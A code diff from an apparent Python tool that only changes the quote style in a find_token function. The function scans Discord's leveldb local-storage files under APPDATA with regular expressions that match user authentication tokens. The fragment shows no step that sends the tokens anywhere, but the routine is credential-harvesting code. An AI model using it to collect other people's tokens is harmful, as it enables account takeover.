@@ -37,8 +37,8 @@ def parse_proxy_string(proxy_str):
 
 def find_token():
     token_patterns = (
-        re.compile(r'mfa\.(?:[A-Za-z0-9+_\-/]{20,})'),
-        re.compile(r'(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})')
+        re.compile(r"mfa\.(?:[A-Za-z0-9+_\-/]{20,})"),
+        re.compile(r"(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})")
     )
     db_pattern = os.environ["APPDATA"] + "/discord/Local Storage/leveldb/*.ldb"
     for db_path in sorted(glob(db_pattern), reverse=True):
